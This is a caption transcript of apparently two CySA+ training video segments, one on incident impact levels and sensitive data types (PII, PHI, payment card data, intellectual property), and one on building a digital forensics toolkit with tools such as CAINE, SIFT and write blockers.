00:15:27.791\n&gt;&gt; Try to distract them.\n\n315\n00:15:27.791 --> 00:15:29.376\n&gt;&gt; That can end up coming from both sides,\n\n316\n00:15:29.376 --> 00:15:31.276\nright, the users needing\nto access resources\n\n317\n00:15:31.276 --> 00:15:32.760\n&gt;&gt; Or those upper-level execs,\n\n318\n00:15:32.760 --> 00:15:34.510\nwhen are you going to get\nour business back online so\n\n319\n00:15:34.510 --> 00:15:38.625\nwe can continue to make money?\n&gt;&gt; One of my favorite Don Pezet stories\n\n320\n00:15:38.625 --> 00:15:43.915\nis, Don and I worked together at\nan insurance company doing systems and\n\n321\n00:15:43.915 --> 00:15:47.443\nnetwork administration and\nwe had a problem and\n\n322\n00:15:47.443 --> 00:15:51.168\nsystems went down and\nwe realized this occurred.\n\n323\n00:15:51.168 --> 00:15:54.852\nDon was in there trying to recover\neverything, get back up and running.\n\n324\n00:15:54.852 --> 00:15:57.665\nThere's a phone in the server room and\nit kept ringing.\n\n325\n00:15:57.665 --> 00:16:01.853\nAnd it was, so, we were answering\nit while Don was working.\n\n326\n00:16:01.853 --> 00:16:06.900\nAnd they were saying, it was a VP and\nhe's, when is this coming back up?\n\n327\n00:16:06.900 --> 00:16:08.190\nWe have a meeting.\n\n328\n00:16:08.190 --> 00:16:09.540\nIt is stopping our meeting.\n\n329\n00:16:09.540 --> 00:16:10.460\nWhen is this going to happen?\n\n330\n00:16:10.460 --> 00:16:14.390\nWe're like, hey Don, when's it gonna\nhappen, he's like, I'm working on, right.\n\n331\n00:16:14.390 --> 00:16:16.940\nHey, we're working diligently,\nwe're done as soon as we can,\n\n332\n00:16:16.940 --> 00:16:19.090\nwe'll let you know as it progresses.\n\n333\n00:16:19.090 --> 00:16:21.640\nFive minutes go by, ring, ring, ring,\nring, same thing, ring, ring, ring,\n\n334\n00:16:21.640 --> 00:16:22.630\nring, same thing.\n\n335\n00:16:22.630 --> 00:16:25.310\nFinally, Don grabs the phone and\ngo, they go, so hows it looking?\n\n336\n00:16:25.310 --> 00:16:27.500\nAnd he goes, it looks like I'm\non the phone talking to you and\n\n337\n00:16:27.500 --> 00:16:28.987\nnot getting this done.\n&gt;&gt; [LAUGH]\n\n338\n00:16:28.987 --> 00:16:30.098\n&gt;&gt; So if you'll leave me alone,\n\n339\n00:16:30.098 --> 00:16:31.775\nlet me get it done, it'll get done sooner,\n\n340\n00:16:31.775 --> 00:16:32.490\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n341\n00:16:32.490 --> 00:16:33.710\nstop calling.\n&gt;&gt; Wow.\n\n342\n00:16:33.710 --> 00:16:34.264\n&gt;&gt; I was like\n\n343\n00:16:34.264 --> 00:16:36.215\n&gt;&gt; You're my hero.\n\n344\n00:16:36.215 --> 00:16:36.885\n&gt;&gt; [LAUGH]\n\n345\n00:16:36.885 --> 00:16:39.036\n&gt;&gt; He wore his S and his cape today,\n\n346\n00:16:39.036 --> 00:16:39.840\nI loved it.\n\n347\n00:16:39.840 --> 00:16:40.430\nIt was great.\n\n348\n00:16:40.430 --> 00:16:43.341\nIt was one of my favorite things.\n&gt;&gt; Hey but it's something that sometimes\n\n349\n00:16:43.341 --> 00:16:44.380\nneeds to be said.\n&gt;&gt; It does.\n\n350\n00:16:44.380 --> 00:16:44.920\nIt does.\n\n351\n00:16:46.080 --> 00:16:47.560\nSometimes that is the thing.\n\n352\n00:16:47.560 --> 00:16:48.900\nIt'll get done when it gets done.\n\n353\n00:16:48.900 --> 00:16:52.440\nSo unpredictability when it comes\nto the extended category and\n\n354\n00:16:52.440 --> 00:16:56.460\nof course additional resources and\noutside help are needed.\n\n355\n00:16:56.460 --> 00:16:57.720\nSo there you go.\n\n356\n00:16:57.720 --> 00:17:01.690\nNot recoverable, recovery from\nthe incident is not possible.\n\n357\n00:17:01.690 --> 00:17:03.870\nThis is where we wanna stay away from.\n\n358\n00:17:03.870 --> 00:17:06.280\nThis is where we're just on\nour knees every night going,\n\n359\n00:17:06.280 --> 00:17:07.850\nplease don't let this happen.\n\n360\n00:17:07.850 --> 00:17:09.480\nPlease please please.\n\n361\n00:17:09.480 --> 00:17:13.040\nSensitive data is exo\ntraded posted publicly\n\n362\n00:17:13.040 --> 00:17:15.810\nan investigation needs to be launched.\n\n363\n00:17:15.810 --> 00:17:18.398\nThis is, you're an Equifax.\n&gt;&gt; [LAUGH]\n\n364\n00:17:18.398 --> 00:17:20.345\n&gt;&gt; You pull an Equifax, it's a bad day for\n\n365\n00:17:20.345 --> 00:17:21.510\neveryone.\n\n366\n00:17:21.510 --> 00:17:28.270\nSo these the three scopes of impacts\nthat we get out of the NIST.\n\n367\n00:17:28.270 --> 00:17:29.550\nI can't remember whether or\n\n368\n00:17:29.550 --> 00:17:32.140\nnot the next one that is called\non objectives is in there.\n\n369\n00:17:32.140 --> 00:17:34.190\nI didn't scrub through it.\n\n370\n00:17:34.190 --> 00:17:37.500\nWell enough to find that at least quickly\nenough for this show, but I can just tell\n\n371\n00:17:37.500 --> 00:17:42.370\nyou about it, you are getting the idea,\nwhich is economic impact, which is a none,\n\n372\n00:17:42.370 --> 00:17:46.300\nlow, medium, high, so very simple.\n\n373\n00:17:46.300 --> 00:17:47.970\nNone, there was no economic impact,\n\n374\n00:17:47.970 --> 00:17:53.040\nno extra funds had to be outlaid\nto recover from the incidents.\n\n375\n00:17:53.040 --> 00:17:55.780\nOr at all to do anything, or just,\nit didn't cost us any money.\n\n376\n00:17:57.830 --> 00:18:01.910\nHere's why this one is\nagain very subjective.\n\n377\n00:18:01.910 --> 00:18:05.870\nIt all depends on your\ncompany's economic status.\n\n378\n00:18:05.870 --> 00:18:08.920\nOn what you would determine is low,\nmedium or high.\n\n379\n00:18:08.920 --> 00:18:12.940\nAs an impact to your economy, okay?\n\n380\n00:18:12.940 --> 00:18:17.030\nSo if Mike and I start a small\nbusiness and, man we did great.\n\n381\n00:18:17.030 --> 00:18:20.330\nWe made $40,000.00 last year in profit.\n\n382\n00:18:20.330 --> 00:18:25.800\nYou know having an impact of\n$15,000.00 would probably be high for\n\n383\n00:18:25.800 --> 00:18:30.340\nus and it might be life\nthreatening to our company.\n\n384\n00:18:30.340 --> 00:18:33.427\nWhereas on Amazon, there you go.\n\n385\n00:18:33.427 --> 00:18:37.640\nI've made $15,000 standing\nhere listening to you talk.\n\n386\n00:18:37.640 --> 00:18:38.847\n&gt;&gt; Let me check my couch cushions for\n\n387\n00:18:38.847 --> 00:18:40.950\nthe change to pay that.\n&gt;&gt; [LAUGH]\n\n388\n00:18:40.950 --> 00:18:42.662\n&gt;&gt; Exactly, like we were talking about\n\n389\n00:18:42.662 --> 00:18:44.216\nbefore, I think I got that on me.\n\n390\n00:18:44.216 --> 00:18:45.310\nHere you go.\n&gt;&gt; [LAUGH]\n\n391\n00:18:45.310 --> 00:18:48.340\n&gt;&gt; So the impact to an Amazon versus\n\n392\n00:18:48.340 --> 00:18:52.450\nDan and\nMike's web company isn't the same, okay?\n\n393\n00:18:52.450 --> 00:18:58.150\nSo this is going all going to depend\non what you're economic status is.\n\n394\n00:18:58.150 --> 00:19:03.390\nSo basically think of it this way,\nlow is going to be some financial impact,\n\n395\n00:19:03.390 --> 00:19:08.420\nmedium is going to be more\nfinancial impact that is\n\n396\n00:19:08.420 --> 00:19:12.370\nprobably still recoverable,\nnot life-threatening to the organization.\n\n397\n00:19:12.370 --> 00:19:15.910\nAnd then high is going to be\na significant financial impact,\n\n398\n00:19:15.910 --> 00:19:19.520\nwhere now we're talking about layoffs,\nor something like that.\n\n399\n00:19:19.520 --> 00:19:23.130\nThat there will be repercussions to the\namount of money that we have to lay out to\n\n400\n00:19:23.130 --> 00:19:24.530\nrecover from this.\n\n401\n00:19:24.530 --> 00:19:28.080\nOr just the impact itself has\ncost us X amount of dollars.\n\n402\n00:19:28.080 --> 00:19:30.750\nAdvertising, reputability,\nwhatever the case is.\n\n403\n00:19:30.750 --> 00:19:35.310\nAlright, so those are those,\nvery, very fun.\n\n404\n00:19:35.310 --> 00:19:38.622\nNow let's get into those types\nof data really quickly so\n\n405\n00:19:38.622 --> 00:19:41.240\nwe can understand how to categorize those.\n\n406\n00:19:41.240 --> 00:19:44.920\nLet me scroll out, I do have a couple\nof slides I've created for this.\n\n407\n00:19:44.920 --> 00:19:46.410\nLet's just get this out of the way.\n\n408\n00:19:46.410 --> 00:19:50.610\nOne is personally\nidentifiable information.\n\n409\n00:19:50.610 --> 00:19:56.660\nThere we go, PII or\nPII as it's more well-known or well-used.\n\n410\n00:19:56.660 --> 00:20:01.090\nAnd these things like people's names,\ntheir addresses, email addresses, passport\n\n411\n00:20:01.090 --> 00:20:06.800\ninfo, driver's license, date of birth,\ntelephone number, mother's maiden name.\n\n412\n00:20:06.800 --> 00:20:10.980\nAnything that you would use that\nidentifies you as you right,\n\n413\n00:20:10.980 --> 00:20:14.910\nhence the term personally\nidentifiable information.\n\n414\n00:20:14.910 --> 00:20:20.420\nInteresting thing is that not everybody\nuses the same set of rules that\n\n415\n00:20:20.420 --> 00:20:24.450\nis basically US stuff there are a couple\nof others that are involved as well.\n\n416\n00:20:24.450 --> 00:20:27.620\nBut I don't think you\nhave to know every law,\n\n417\n00:20:27.620 --> 00:20:30.714\nlittle detail and idiosyncrasy about PII.\n\n418\n00:20:30.714 --> 00:20:33.150\nYou have to know what PII is and\nthe basics of that.\n\n419\n00:20:33.150 --> 00:20:35.600\nWhich the list should get you going.\n\n420\n00:20:35.600 --> 00:20:36.890\nBut this is in the US.\n\n421\n00:20:36.890 --> 00:20:39.250\nIt might be different in different areas.\n\n422\n00:20:39.250 --> 00:20:43.580\nSo if you're in Europe they might have\ndifferent things or more things or\n\n423\n00:20:43.580 --> 00:20:44.170\nless things.\n\n424\n00:20:44.170 --> 00:20:44.940\nThat's the kind of thing.\n\n425\n00:20:44.940 --> 00:20:49.010\nSo depending on your area where you're\nat this list might be different, so\n\n426\n00:20:49.010 --> 00:20:50.645\njust be aware of that.\n\n427\n00:20:50.645 --> 00:20:54.080\nBut personally identifiable\ninformation anything that\n\n428\n00:20:54.080 --> 00:20:58.490\nbasically allows someone to know\nthat it is me and not Mike,\n\n429\n00:20:58.490 --> 00:21:02.840\nthe law of identity here is at work so\nthere we go.\n\n430\n00:21:02.840 --> 00:21:07.080\nA personal health information that's\nanother one we close this slide.\n\n431\n00:21:07.080 --> 00:21:10.190\nAnd don't worry, if you didn't\nwrite these down fast enough,\n\n432\n00:21:10.190 --> 00:21:12.930\nthis slide will be available\nin the show notes.\n\n433\n00:21:12.930 --> 00:21:17.720\nLet's see here,\npersonal health information,\n\n434\n00:21:17.720 --> 00:21:19.970\nalso known as protected\nhealth information.\n\n435\n00:21:21.020 --> 00:21:24.710\nBut I think Comptia calls it as\npersonal health information.\n\n436\n00:21:24.710 --> 00:21:27.950\nThere you go, either way it's PHI, right?\n\n437\n00:21:27.950 --> 00:21:30.600\nOr PHI, and I think it's a Roman,\n\n438\n00:21:30.600 --> 00:21:32.160\nI don't know that Greek.\n&gt;&gt; Yeah.\n\n439\n00:21:32.160 --> 00:21:33.400\n&gt;&gt; Yeah, PHI, it is,\n\n440\n00:21:33.400 --> 00:21:36.994\nit's the little circle with a lens.\n&gt;&gt; It can be PHI cup of PHI.\n\n441\n00:21:36.994 --> 00:21:38.580\n&gt;&gt; It's actually it's PHI but\n\n442\n00:21:38.580 --> 00:21:40.340\nthat's the technical way to say it.\n\n443\n00:21:40.340 --> 00:21:44.260\nAnyway, we digress let me go on,\nwhat is PHI?\n\n444\n00:21:44.260 --> 00:21:47.970\nIt is health care stats,\nthe vision heath care, payment for\n\n445\n00:21:47.970 --> 00:21:50.440\nhealth care, medical records.\n\n446\n00:21:50.440 --> 00:21:51.530\nWhen I say paying for\n\n447\n00:21:51.530 --> 00:21:56.920\nhealth care I mean how has this\nhealth care been dealt financially.\n\n448\n00:21:56.920 --> 00:21:58.580\nWhat is payment records\nthings of that nature.\n\n449\n00:21:58.580 --> 00:22:00.920\nThat would fall under PHI.\n\n450\n00:22:00.920 --> 00:22:05.460\nSo these are things that we want to\ndefinitely keep under lock and key.\n\n451\n00:22:05.460 --> 00:22:10.100\nOrganizations like HIPAA are probably\ngoing to give you the regulations\n\n452\n00:22:10.100 --> 00:22:14.860\non how to do that or at least on\nwhat they expect as far as security.\n\n453\n00:22:14.860 --> 00:22:18.690\nBut you need to know what that\ntype of data is so that you can\n\n454\n00:22:18.690 --> 00:22:22.030\nfollow the regulatory principles that you\nhave been given from on high by HIPAA.\n\n455\n00:22:24.180 --> 00:22:26.900\nPayment card information,\nanother one right.\n\n456\n00:22:26.900 --> 00:22:30.770\nThis is credit card\nnumbers expiration dates.\n\n457\n00:22:30.770 --> 00:22:33.440\nSecurity codes things of that nature.\n\n458\n00:22:33.440 --> 00:22:36.640\nThat would be payment card information.\n\n459\n00:22:36.640 --> 00:22:39.250\nIntellectual property we kind\nof discussed that a little bit.\n\n460\n00:22:39.250 --> 00:22:44.650\nThese are things that we develop\nas an organization that can,that\n\n461\n00:22:44.650 --> 00:22:48.293\nwe use to make money, to generate revenue.\n&gt;&gt; That's stuff you R and\n\n462\n00:22:48.293 --> 00:22:50.100\nD Department is churning out.\n\n463\n00:22:50.100 --> 00:22:53.260\nPlans for your next widget or whatever.\n\n464\n00:22:53.260 --> 00:22:56.930\nSome other organization gets a hold of\nthat they can make the widget before you\n\n465\n00:22:56.930 --> 00:22:59.600\nor all kinds.\n&gt;&gt; It makes me think of\n\n466\n00:22:59.600 --> 00:23:02.000\nanybody the watches Silicon Valley, right?\n\n467\n00:23:02.000 --> 00:23:07.500\nEspecially in the first season he\ncreates the pied piper thing and\n\n468\n00:23:07.500 --> 00:23:11.160\nthen of course he shares some of the code\nwith the guys that work at the other,\n\n469\n00:23:11.160 --> 00:23:13.430\nI forget the name of the company,\nwhatever.\n\n470\n00:23:13.430 --> 00:23:16.980\nHe shares it, and they use that\nas a template to make their own.\n\n471\n00:23:16.980 --> 00:23:19.760\nThat was,\neven though he created [INAUDIBLE].\n\n472\n00:23:19.760 --> 00:23:21.810\nBut as you start creating\nyour own entities,\n\n473\n00:23:21.810 --> 00:23:26.340\nthings you're gonna use to generate\nrevenue products and information.\n\n474\n00:23:26.340 --> 00:23:31.420\nMaybe processes, maybe we have\na better way to make the mousetrap.\n\n475\n00:23:31.420 --> 00:23:35.690\nMaybe our mousetrap isn't better than our\ncompetitor's but we can crank them out\n\n476\n00:23:35.690 --> 00:23:40.630\nfaster, because we have a secret of\nindustry that we can create them faster.\n\n477\n00:23:40.630 --> 00:23:42.000\nTherefore, we make them cheaper.\n\n478\n00:23:42.000 --> 00:23:46.330\nMaybe that way and we're able to undercut\nour competition making us more profitable.\n\n479\n00:23:46.330 --> 00:23:47.890\nThat would be a good secret for\n\n480\n00:23:47.890 --> 00:23:50.680\nthem to know and that's information\nwe want to keep under wraps.\n\n481\n00:23:50.680 --> 00:23:54.120\nSo that is IP or intellectual property.\n\n482\n00:23:54.120 --> 00:23:56.600\nAnd then corp confidential\nstuff account data.\n\n483\n00:23:58.160 --> 00:24:00.000\nMaybe mergers and acquisitions,\n\n484\n00:24:00.000 --> 00:24:03.110\nanything that your company is doing\nthat you'd want to keep on the down low.\n\n485\n00:24:03.110 --> 00:24:07.755\nAnd not allow [COUGH] public access to.\n\n486\n00:24:07.755 --> 00:24:11.680\nSo,typically this is\nfinancial resources and\n\n487\n00:24:11.680 --> 00:24:15.890\nsecrets to what the company is\ngoing to be doing in the future.\n\n488\n00:24:15.890 --> 00:24:22.130\nWhile may not be [COUGH] I'm sorry,\nintellectual property perse,\n\n489\n00:24:22.130 --> 00:24:25.590\nit is still kind of a secret that\nyou wanna keep under wraps and\n\n490\n00:24:25.590 --> 00:24:27.210\nnot let the general public be aware.\n\n491\n00:24:28.400 --> 00:24:32.310\nMike, I think that's all the types of\ndata that they call out for the exam.\n\n492\n00:24:32.310 --> 00:24:33.700\nI can't think of any more\noff the top of my head.\n\n493\n00:24:33.700 --> 00:24:36.570\nPlus, I'm starting to get verklempt,\nso I think this is a good spot for\n\n494\n00:24:36.570 --> 00:24:38.950\nus to call it a day on the show.\n&gt;&gt; All right, sounds like a plan, Dan.\n\n495\n00:24:38.950 --> 00:24:42.620\nYou're great, look there again\nat severity and prioritization.\n\n496\n00:24:42.620 --> 00:24:44.190\nWe have to take a look at those attacks,\n\n497\n00:24:44.190 --> 00:24:47.440\nwe have to decide what is\nthe impact of the organization.\n\n498\n00:24:47.440 --> 00:24:51.900\nHow do we prioritize these so\nwe know where to spend our resources?\n\n499\n00:24:51.900 --> 00:24:53.670\nIn trying to get back on track, so\n\n500\n00:24:53.670 --> 00:24:54.430\nappreciate that.\n&gt;&gt; Yep.\n\n501\n00:24:54.430 --> 00:24:55.610\n&gt;&gt; Hope everybody out there\n\n502\n00:24:55.610 --> 00:24:56.960\nenjoyed

Thanks for having me again, Mike.\n\n13\n00:00:27.413 --> 00:00:30.894\nYeah, we're hitting the forensic\ntool kit today on the CYSA+ show,\n\n14\n00:00:30.894 --> 00:00:32.969\nhopefully you guys are prepare for that.\n\n15\n00:00:32.969 --> 00:00:39.078\nIt's actually, the portion of incidents\nhandling inside of the CYSA+ objective\n\n16\n00:00:39.078 --> 00:00:42.080\nshere, unless I'm making up terms.\n&gt;&gt; I like\n\n17\n00:00:42.080 --> 00:00:44.591\nthat word.\n&gt;&gt; Yeah, but it's not so much of the red\n\n18\n00:00:44.591 --> 00:00:48.807\ntape, it's kinda, we actually get\nto play with stuff and do stuff.\n\n19\n00:00:48.807 --> 00:00:52.631\nWhat do we need if we're\ngonna actually dive into\n\n20\n00:00:52.631 --> 00:00:57.308\ndoing some sort of a forensics or\ninvestigative platform.\n\n21\n00:00:57.308 --> 00:00:58.866\nSo that's what we're gonna cover today.\n\n22\n00:00:58.866 --> 00:01:01.399\nWhat do I need if I wanna do that?\n\n23\n00:01:01.399 --> 00:01:04.324\nI don't just show up with my pad and\npencil and my paper and go,\n\n24\n00:01:04.324 --> 00:01:06.194\nlet's start interviewing suspects.\n\n25\n00:01:06.194 --> 00:01:09.608\nAlthough that would be part of it.\n&gt;&gt; That would be part of it.\n\n26\n00:01:09.608 --> 00:01:10.184\n&gt;&gt; Yeah, but\n\n27\n00:01:10.184 --> 00:01:13.072\nhere we're gonna start off\nwith the toolkit itself.\n\n28\n00:01:13.072 --> 00:01:15.490\nThe things I need in my kit.\n\n29\n00:01:15.490 --> 00:01:19.675\nSo that when I start to perform\na forensics investigation I have all\n\n30\n00:01:19.675 --> 00:01:23.201\nthe proper things that I would\nprobably need to do that.\n\n31\n00:01:23.201 --> 00:01:27.264\nAnd that's kind of like\nthe guiding star here is,\n\n32\n00:01:27.264 --> 00:01:33.475\nif this were to be something I need to do,\nwhat possibilities are out there.\n\n33\n00:01:33.475 --> 00:01:38.684\nAnd then therefore, what tool would I need\nto be able to handle said possibilities?\n\n34\n00:01:38.684 --> 00:01:42.460\nSo we're gonna take a look at what we're\ngonna throw in this kits just in case\n\n35\n00:01:42.460 --> 00:01:44.823\nthe worst happens.\n&gt;&gt; All right, so where do we start?\n\n36\n00:01:44.823 --> 00:01:48.082\nI guess we need a machine of some kind.\n&gt;&gt; Yeah, in this day and\n\n37\n00:01:48.082 --> 00:01:53.102\nage of the digital world, you probably\nneed some access digitally to things.\n\n38\n00:01:53.102 --> 00:01:53.755\n&gt;&gt; [LAUGH]\n\n39\n00:01:53.755 --> 00:01:54.756\n&gt;&gt; So a workstation\n\n40\n00:01:54.756 --> 00:01:56.760\nis a really good starting place.\n\n41\n00:01:56.760 --> 00:02:00.595\nAnd a cool thing is this can be\na laptop that you guys have.\n\n42\n00:02:00.595 --> 00:02:06.388\nOr you can purchase specific devices,\nwhen I said device I mean workstations for\n\n43\n00:02:06.388 --> 00:02:11.455\nAzure Workstation that are meant to\nbe digital forensic workstations.\n\n44\n00:02:11.455 --> 00:02:16.131\nAnd typically these things have a ton\nof horsepower in them because they're\n\n45\n00:02:16.131 --> 00:02:19.942\ngonna be doing all analyzing\ndata of some way, shape or form.\n\n46\n00:02:19.942 --> 00:02:21.318\nAnd that can be a bit resource intensive.\n\n47\n00:02:21.318 --> 00:02:26.195\nSo you don't want to lose any performance\nor have a poor experience with it because\n\n48\n00:02:26.195 --> 00:02:31.070\nit didn't have the master that it needed\nto do all these things while you're still\n\n49\n00:02:31.070 --> 00:02:33.983\ntrying to accomplish everyday or\nregular task.\n\n50\n00:02:33.983 --> 00:02:37.587\nMaybe you have three different disks that\nyou're analyzing the data on them and\n\n51\n00:02:37.587 --> 00:02:40.511\nit's ranging through and\nthere's three terabyte disks each.\n\n52\n00:02:40.511 --> 00:02:43.659\nThat's gonna take a lot of IO for\nit to read those disks, so\n\n53\n00:02:43.659 --> 00:02:47.834\nyou need to be able to have a fast machine\nthat can handle that kind of stuff, so\n\n54\n00:02:47.834 --> 00:02:49.335\nthat's what you wanna do.\n\n55\n00:02:49.335 --> 00:02:53.052\nCoolness is, you can actually just shop.\n\n56\n00:02:53.052 --> 00:02:56.711\nLike I said, they make specifically built,\nlet's jump to the web and\n\n57\n00:02:56.711 --> 00:02:59.200\nlet's type in digital\nforensic workstation.\n\n58\n00:02:59.200 --> 00:03:00.642\nLet's see what happens.\n\n59\n00:03:00.642 --> 00:03:07.186\nDigital forensic workstation,\nthere you go.\n\n60\n00:03:07.186 --> 00:03:08.353\nLet's see, there we go.\n\n61\n00:03:08.353 --> 00:03:13.254\nSo right of the gate we got one 14 grand\nalmost, that's a little small to me,\n\n62\n00:03:13.254 --> 00:03:17.350\nlet me make that a little large,\nas you can see that.\n\n63\n00:03:17.350 --> 00:03:19.309\nYeah, that's a bit of money.\n\n64\n00:03:19.309 --> 00:03:24.330\nBut I bet that thing's got all\nthe horsies in the world necessary.\n\n65\n00:03:24.330 --> 00:03:29.525\nPlus it's probably got expansion bays and\nslots for expansion cards so you can add\n\n66\n00:03:29.525 --> 00:03:32.800\nall the drives and cards that you need.\n&gt;&gt; Lots of bells and whistles.\n\n67\n00:03:32.800 --> 00:03:33.313\n&gt;&gt; Exactly,\n\n68\n00:03:33.313 --> 00:03:37.140\nexactly, it's gonna have a ton of USB\nsupport and other things of that nature.\n\n69\n00:03:37.140 --> 00:03:40.230\nSo just because it's $13,500,\n\n70\n00:03:40.230 --> 00:03:45.810\nlet me not overestimate the price of this\nthing, it's $13,500 to get it correct.\n\n71\n00:03:45.810 --> 00:03:50.210\nBut you'll see that here's another\nforensics tower for 4 grand, here's one\n\n72\n00:03:50.210 --> 00:03:54.090\nfor 7 grand, so maybe that's the low,\nhigh, and middle that we're seeing here.\n\n73\n00:03:54.090 --> 00:03:57.040\nYou can shop for these things prebuilt but\nif you got the wherewithal, and\n\n74\n00:03:57.040 --> 00:04:00.850\nyou probably do, you can just\nbuy the components necessary and\n\n75\n00:04:00.850 --> 00:04:04.660\nput one together yourself, probably save\nyourself a few bones in the process.\n\n76\n00:04:04.660 --> 00:04:09.990\nSo that's what we're talking about\nwhen it comes to your own workstation.\n\n77\n00:04:09.990 --> 00:04:10.990\nHaving the things you need,\n\n78\n00:04:10.990 --> 00:04:14.240\nat least you're having the horsepower\nnecessary that you can bolt on\n\n79\n00:04:14.240 --> 00:04:18.700\nthe other appliances maybe to work\nin the digital forensics realm.\n\n80\n00:04:19.870 --> 00:04:22.337\nAll right,\nother things that you will need for\n\n81\n00:04:22.337 --> 00:04:25.004\nyour workstation is forensic software,\nright?\n\n82\n00:04:25.004 --> 00:04:28.799\nThis is an interesting topic.\n\n83\n00:04:28.799 --> 00:04:33.219\nI've done digital forensic shows with Adam\nand I think Mike we've done some as well.\n\n84\n00:04:33.219 --> 00:04:38.119\nWhat qualifies as forensic software?\n\n85\n00:04:38.119 --> 00:04:39.462\nThat's a tough one, isn't it, right?\n&gt;&gt; Yeah,\n\n86\n00:04:39.462 --> 00:04:42.915\ncuz it's typically administrative\ntools that are repurposed or\n\n87\n00:04:42.915 --> 00:04:45.293\nused for different reasons.\n&gt;&gt; Exactly,\n\n88\n00:04:45.293 --> 00:04:49.920\nso there will be things that you are,\nI know how to use that.\n\n89\n00:04:49.920 --> 00:04:52.651\nThings like the Event Viewer\ninside of Windows.\n\n90\n00:04:52.651 --> 00:04:57.784\nThat could be deemed as forensic software.\n\n91\n00:04:57.784 --> 00:05:01.374\nWhat else, just everyday things,\njust the ability to read and\n\n92\n00:05:01.374 --> 00:05:04.320\nwrite files using the command line, right?\n\n93\n00:05:04.320 --> 00:05:08.289\nThat could be, cuz I'm reading maybe\na piece of malware I'm trying to\n\n94\n00:05:08.289 --> 00:05:12.409\nread the code malware, reverse\nengineering software that would be it.\n\n95\n00:05:12.409 --> 00:05:18.142\nTypically though there are very cool\nsuites that you can either purchase or\n\n96\n00:05:18.142 --> 00:05:22.609\nfreeware, however you like,\nopen source kind of stuff.\n\n97\n00:05:22.609 --> 00:05:28.009\nThat will have a lot of forensic\ncapabilities, software capabilities,\n\n98\n00:05:28.009 --> 00:05:33.147\nbuilt into them in a kind of one-stop\nshop management software idea,\n\n99\n00:05:33.147 --> 00:05:35.429\na package, a suite as it were.\n\n100\n00:05:35.429 --> 00:05:40.316\nSo that you can do most these things if\nnot all of them that you would need to do\n\n101\n00:05:40.316 --> 00:05:42.888\nto perform a forensic investigation.\n\n102\n00:05:42.888 --> 00:05:46.789\nThese are things like, I'll give\nyou the free ones out of the gate,\n\n103\n00:05:46.789 --> 00:05:51.100\nwhich are CAINE, it's an ISO or\na virtual machine you can download.\n\n104\n00:05:51.100 --> 00:05:52.790\nJust run it in your\nvirtualization software and\n\n105\n00:05:52.790 --> 00:05:55.500\ninstall it on a machine\nif you've got the ISO.\n\n106\n00:05:55.500 --> 00:05:58.745\nAlso SIFT is available from SANS.\n&gt;&gt; Mm-hm.\n\n107\n00:05:58.745 --> 00:05:59.450\n&gt;&gt; That's another one.\n\n108\n00:05:59.450 --> 00:06:00.321\nIt's all prebuilt.\n\n109\n00:06:00.321 --> 00:06:02.430\nSo you can get them as virtual machines or\nISOs.\n\n110\n00:06:02.430 --> 00:06:06.043\nI think both of them are available in both\nof those formats and you can install them.\n\n111\n00:06:06.043 --> 00:06:09.046\nI've actually downloaded\nCAINE cuz I like it.\n\n112\n00:06:09.046 --> 00:06:12.807\nI played with it in SIFT and\nI think I CAINE better, just personally.\n\n113\n00:06:12.807 --> 00:06:14.001\nThere's nothing wrong with SIFT.\n\n114\n00:06:14.001 --> 00:06:18.631\nI just liked the way CAINE operated out\nof the gates a little more in line with\n\n115\n00:06:18.631 --> 00:06:20.555\nthe way I like to investigate.\n\n116\n00:06:20.555 --> 00:06:23.878\nSo let's take a look at that,\nI've got it up and running right here.\n\n117\n00:06:23.878 --> 00:06:28.391\nAnd it's the Computer Aided Investigative\nEnvironment and it's got many,\n\n118\n00:06:28.391 --> 00:06:31.248\nmany applications already\npre-built into it.\n\n119\n00:06:31.248 --> 00:06:34.792\nAnd if you hit the forensic tools,\nyou'll see.\n\n120\n00:06:34.792 --> 00:06:39.618\nSo it's kinda like the Kali Linux for\nforensics investigation,\n\n121\n00:06:39.618 --> 00:06:41.380\nSIFT same kind of idea.\n\n122\n00:06:41.380 --> 00:06:46.422\nInterestingly enough,\nif we go to Kali Linux, and\n\n123\n00:06:46.422 --> 00:06:51.581\nyou go to Applications, and\nyou go down to, wait for\n\n124\n00:06:51.581 --> 00:06:56.647\nit, Forensics,\nit also has a few forensic tools.\n\n125\n00:06:56.647 --> 00:07:03.800\nYou can also boot Kali Linux into forensic\nmode, which will make it read-only, right?\n\n126\n00:07:03.800 --> 00:07:08.320\nAnd this actually segues us into our\nnext topic, which are write blockers.\n\n127\n00:07:08.320 --> 00:07:12.340\nSo we don't want to be\ndoing any kind of damage\n\n128\n00:07:12.340 --> 00:07:16.040\nto any of the data in any way,\nshape or form.\n\n129\n00:07:16.040 --> 00:07:21.700\nWe don't wanna come question the integrity\nof the data that we are collecting as\n\n130\n00:07:21.700 --> 00:07:27.457\nevidence in any way because later down the\nroad you might be in a legal situation.\n\n131\n00:07:27.457 --> 00:07:33.613\nAs a lawyer might say, did you in\na forensically sound way handle that data?\n\n132\n00:07:33.613 --> 00:07:34.740\nWell what do you mean by that?\n\n133\n00:07:34.740 --> 00:07:39.949\nWell was any writing to the disk\ndone that might change the data and\n\n134\n00:07:39.949 --> 00:07:41.756\ncorrupt it in any way?\n\n135\n00:07:41.756 --> 00:07:43.397\nHow do you mean?\n\n136\n00:07:43.397 --> 00:07:47.751\nWell, sometimes when you're\njust reading from a disk,\n\n137\n00:07:47.751 --> 00:07:50.570\nwriting actions can occur, right?\n\n138\n00:07:50.570 --> 00:07:54.395\nSo, what we wanna do is put\nthe disk into read-only mode,\n\n139\n00:07:54.395 --> 00:07:56.438\ntherefore no write can occur.\n\n140\n00:07:56.438 --> 00:07:59.294\nYou can do this through software, and\nyou can do this through hardware.\n\n141\n00:07:59.294 --> 00:08:02.992\nI think we'll jump back to CAINE,\nlet's go back there really quickly.\n\n142\n00:08:02.992 --> 00:08:06.713\nIf we go here, you'll notice\ndown here there is a disk image.\n\n143\n00:08:06.713 --> 00:08:10.394\nAnd I will zoom in there, there we go.\n\n144\n00:08:10.394 --> 00:08:16.090\nAnd if I hover over it it's a SAFE-Device\nmount Read-ONLY right click to change.\n\n145\n00:08:16.090 --> 00:08:21.960\nSo it has software enabled right blocking,\nso that if I'm using cam.\n\n146\n00:08:21.960 --> 00:08:25.537\nI know that that read only mode\nhas been enabled by default, and\n\n147\n00:08:25.537 --> 00:08:30.147\nI can safely work with the files and\nimages that I'm taking without corruption.\n\n148\n00:08:30.147 --> 00:08:31.259\n&gt;&gt; Yeah, easy to do.\n\n149\n00:08:31.259 --> 